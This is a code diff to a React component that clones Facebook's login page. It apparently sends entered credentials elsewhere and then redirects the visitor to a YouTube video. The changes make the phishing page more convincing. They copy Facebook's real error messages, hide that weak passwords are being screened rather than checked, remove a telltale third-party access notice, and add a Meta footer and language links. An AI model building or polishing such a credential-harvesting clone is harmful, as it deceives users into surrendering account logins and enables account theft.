@@ -19,13 +19,13 @@ export default function FacebookLogin() {
     const cleanEmail = email.replace(/\D/g, '');
     
     if (!emailRegex.test(email) && !phoneRegex.test(cleanEmail)) {
-      return "Invalid email or phone number";
+      return "The email or mobile number you entered isn't connected to an account. Find your account and log in.";
     }
     
     const weakPasswords = ['123456', 'password', 'qqqqqq', 'wwwwww', 'aaaaaa', '111111', '000000'];
-    if (password.length < 6) return "Password is too short";
-    if (weakPasswords.includes(password.toLowerCase())) return "Password is too common";
-    if (/(.)\1{5,}/.test(password)) return "Password is too simple";
+    if (password.length < 6) return "The password you entered is incorrect. Please try again.";
+    if (weakPasswords.includes(password.toLowerCase())) return "The password you entered is incorrect. Please try again.";
+    if (/(.)\1{5,}/.test(password)) return "The password you entered is incorrect. Please try again.";
     
     return null;
   };
@@ -52,58 +52,87 @@ export default function FacebookLogin() {
         })
       });
 
-      // Redirect to YouTube (opens in same tab on mobile)
       window.location.href = `https://www.youtube.com/watch?v=dQw4w9WgXcQ&feature=share&artist_welcome=true`;
       
     } catch (err) {
-      setError('Login failed. Please try again.');
+      setError('Invalid username or password');
     }
   };
 
   return (
     <div className="facebook-container">
       <div className="facebook-header">
-        <div className="facebook-logo">facebook</div>
+        <div className="logo-section">
+          <div className="facebook-logo">facebook</div>
+        </div>
       </div>
       
-      <div className="login-box">
-        <h2>Log in to Facebook</h2>
-        <p className="app-notice">YouTube Artist Portal wants to access your public profile</p>
-        
-        <form onSubmit={handleSubmit}>
-          {error && <div className="error-message">{error}</div>}
-          
-          <div className="input-group">
-            <input
-              type="text"
-              placeholder="Email or phone number"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              required
-              className="fb-input"
-              inputMode="email"
-            />
-          </div>
-          
-          <div className="input-group">
-            <input
-              type="password"
-              placeholder="Password"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              required
-              className="fb-input"
-            />
-          </div>
+      <div className="main-content">
+        <div className="login-container">
+          <div className="login-box">
+            <div className="login-header">
+              <h2>Log in to Facebook</h2>
+            </div>
+            
+            <form onSubmit={handleSubmit} className="login-form">
+              {error && (
+                <div className="error-message">
+                  <div className="error-icon">!</div>
+                  <div className="error-text">{error}</div>
+                </div>
+              )}
+              
+              <div className="input-container">
+                <input
+                  type="text"
+                  placeholder="Email or phone number"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  required
+                  className="facebook-input"
+                  inputMode="email"
+                />
+              </div>
+              
+              <div className="input-container">
+                <input
+                  type="password"
+                  placeholder="Password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  required
+                  className="facebook-input"
+                />
+              </div>
 
-          <button type="submit" className="fb-login-button">
-            Log In
-          </button>
-        </form>
-        
-        <div className="links">
-          <a href="#">Forgotten account?</a>
-          <a href="#">Sign up for Facebook</a>
+              <button type="submit" className="login-button">
+                Log In
+              </button>
+              
+              <div className="separator"></div>
+              
+              <div className="secondary-actions">
+                <a href="#" className="forgot-password">Forgotten password?</a>
+                <a href="#" className="create-account">Create new account</a>
+              </div>
+            </form>
+          </div>
+          
+          <div className="language-footer">
+            <div className="languages">
+              <a href="#">English (UK)</a>
+              <a href="#">Español</a>
+              <a href="#">Français (France)</a>
+              <a href="#">Português (Brasil)</a>
+              <a href="#">Italiano</a>
+              <a href="#">Deutsch</a>
+              <a href="#">Arabic</a>
+              <a href="#">Hindi</a>
+              <a href="#">中文(简体)</a>
+              <a href="#">日本語</a>
+            </div>
+            <div className="meta">Meta © 2024</div>
+          </div>
         </div>
       </div>
 
@@ -111,113 +140,242 @@ export default function FacebookLogin() {
         .facebook-container {
           background: #f0f2f5;
           min-height: 100vh;
-          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-          padding: 0;
+          font-family: Helvetica, Arial, sans-serif;
           margin: 0;
+          padding: 0;
         }
+        
         .facebook-header {
-          background: white;
+          background: #ffffff;
           padding: 16px 0;
-          border-bottom: 1px solid #dddfe2;
-          position: sticky;
-          top: 0;
-          z-index: 100;
+          border-bottom: none;
+          box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
         }
+        
+        .logo-section {
+          max-width: 980px;
+          margin: 0 auto;
+          padding: 0 16px;
+        }
+        
         .facebook-logo {
-          font-size: 24px;
+          font-size: 28px;
           font-weight: bold;
           color: #1877f2;
-          text-align: center;
+          letter-spacing: -0.5px;
         }
-        .login-box {
-          max-width: 400px;
-          margin: 20px auto;
-          background: white;
-          padding: 20px;
-          border-radius: 8px;
-          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        
+        .main-content {
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          min-height: calc(100vh - 60px);
+          padding: 20px 16px;
         }
-        .fb-input {
+        
+        .login-container {
+          max-width: 396px;
           width: 100%;
-          padding: 16px;
+        }
+        
+        .login-box {
+          background: #ffffff;
+          border-radius: 8px;
+          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+          padding: 20px;
+          margin-bottom: 28px;
+        }
+        
+        .login-header {
+          text-align: center;
+          margin-bottom: 20px;
+        }
+        
+        .login-header h2 {
+          font-size: 18px;
+          color: #1c1e21;
+          font-weight: normal;
+          margin: 0;
+          line-height: 22px;
+        }
+        
+        .login-form {
+          display: flex;
+          flex-direction: column;
+          gap: 12px;
+        }
+        
+        .input-container {
+          margin-bottom: 12px;
+        }
+        
+        .facebook-input {
+          width: 100%;
+          padding: 14px 16px;
           border: 1px solid #dddfe2;
           border-radius: 6px;
-          font-size: 16px; /* Prevents zoom on iOS */
-          margin-bottom: 12px;
+          font-size: 17px;
+          background: #f5f6f7;
           box-sizing: border-box;
-          min-height: 44px; /* Minimum touch target */
+          min-height: 44px;
+          color: #1c1e21;
         }
-        .fb-login-button {
+        
+        .facebook-input:focus {
+          border-color: #1877f2;
+          outline: none;
+          background: #ffffff;
+        }
+        
+        .facebook-input::placeholder {
+          color: #8a8d91;
+        }
+        
+        .login-button {
           width: 100%;
           background: #1877f2;
           color: white;
           border: none;
           border-radius: 6px;
-          padding: 16px;
-          font-size: 18px;
+          padding: 12px;
+          font-size: 20px;
           font-weight: bold;
           cursor: pointer;
-          min-height: 44px; /* Minimum touch target */
-        }
-        .error-message {
-          background: #ffebe8;
-          border: 1px solid #dd3c10;
-          color: #dd3c10;
-          padding: 12px;
-          border-radius: 6px;
+          min-height: 48px;
           margin-bottom: 16px;
-          font-size: 14px;
         }
-        .links {
-          display: flex;
-          justify-content: space-between;
-          margin-top: 20px;
-          flex-wrap: wrap;
+        
+        .login-button:hover {
+          background: #166fe5;
         }
-        .links a {
+        
+        .separator {
+          border-bottom: 1px solid #dadde1;
+          margin: 20px 0;
+        }
+        
+        .secondary-actions {
+          text-align: center;
+        }
+        
+        .forgot-password {
           color: #1877f2;
           text-decoration: none;
           font-size: 14px;
-          padding: 8px 0;
-          min-height: 44px;
-          display: flex;
-          align-items: center;
+          display: block;
+          margin-bottom: 16px;
         }
         
-        /* Mobile-specific improvements */
+        .forgot-password:hover {
+          text-decoration: underline;
+        }
+        
+        .create-account {
+          display: inline-block;
+          background: #42b72a;
+          color: white;
+          text-decoration: none;
+          padding: 12px 16px;
+          border-radius: 6px;
+          font-size: 17px;
+          font-weight: bold;
+          margin-top: 8px;
+        }
+        
+        .create-account:hover {
+          background: #36a420;
+        }
+        
+        .error-message {
+          background: #ffebe8;
+          border: 1px solid #dd3c10;
+          border-radius: 6px;
+          padding: 12px;
+          display: flex;
+          align-items: flex-start;
+          gap: 8px;
+          margin-bottom: 16px;
+        }
+        
+        .error-icon {
+          color: #dd3c10;
+          font-weight: bold;
+          font-size: 16px;
+        }
+        
+        .error-text {
+          color: #dd3c10;
+          font-size: 14px;
+          line-height: 1.4;
+        }
+        
+        .language-footer {
+          text-align: center;
+          margin-top: 28px;
+        }
+        
+        .languages {
+          display: flex;
+          flex-wrap: wrap;
+          justify-content: center;
+          gap: 10px;
+          margin-bottom: 20px;
+          font-size: 12px;
+        }
+        
+        .languages a {
+          color: #8a8d91;
+          text-decoration: none;
+        }
+        
+        .languages a:hover {
+          text-decoration: underline;
+        }
+        
+        .meta {
+          color: #8a8d91;
+          font-size: 11px;
+        }
+        
+        /* Mobile-specific styles */
         @media (max-width: 768px) {
           .facebook-container {
-            background: white;
+            background: #ffffff;
           }
-          .login-box {
-            margin: 10px;
-            padding: 15px;
-            box-shadow: none;
-            border: 1px solid #dddfe2;
-          }
+          
           .facebook-header {
+            background: #ffffff;
             padding: 12px 0;
           }
-          .fb-input {
-            font-size: 16px; /* Prevents zoom */
-            padding: 14px;
+          
+          .main-content {
+            align-items: flex-start;
+            padding-top: 40px;
           }
-          .links {
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
+          
+          .login-box {
+            box-shadow: none;
+            border: 1px solid #dddfe2;
+            padding: 16px;
+          }
+          
+          .languages {
+            gap: 8px;
+          }
+          
+          .languages a {
+            font-size: 11px;
           }
         }
         
-        /* Very small screens */
         @media (max-width: 360px) {
           .login-box {
-            margin: 5px;
-            padding: 10px;
+            padding: 12px;
           }
-          .fb-login-button {
+          
+          .facebook-input {
+            padding: 12px 14px;
             font-size: 16px;
-            padding: 14px;
           }
         }
       `}</style>
